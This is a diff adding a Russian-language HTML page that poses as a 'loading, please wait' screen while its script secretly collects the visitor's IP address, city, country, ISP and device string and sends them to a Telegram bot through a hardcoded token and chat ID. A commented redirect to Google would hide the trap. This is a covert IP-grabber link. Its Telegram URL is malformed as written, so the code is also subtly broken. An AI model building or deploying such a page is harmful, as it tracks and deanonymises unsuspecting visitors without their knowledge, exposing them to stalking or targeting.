@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка...</title>
+</head>
+<body>
+    <script>
+        async function sendIp() {
+            const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+            const CHAT_ID = "8426763446";
+
+            try {
+                // 1. Получаем данные об IP и местоположении
+                const response = await fetch('https://ipapi.co');
+                const data = await response.json();
+
+                // 2. Собираем информацию об устройстве
+                const device = navigator.userAgent;
+
+                // 3. Формируем текст сообщения
+                const text = `
+Новый переход по ссылке!
+📍 IP: ${data.ip}
+🌍 Город: ${data.city}, ${data.country_name}
+🏢 Провайдер: ${data.org}
+📱 Устройство: ${device}
+                `;
+
+                // 4. Отправляем в Telegram
+                await fetch(`https://api.telegram.org{TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+
+                // 5. Перенаправляем пользователя (опционально)
+                // window.location.href = "https://google.com"; 
+
+            } catch (error) {
+                console.error('Ошибка:', error);
+            }
+        }
+
+        sendIp();
+    </script>
+    <h1>Страница загружается, подождите...</h1>
+</body>
+</html>
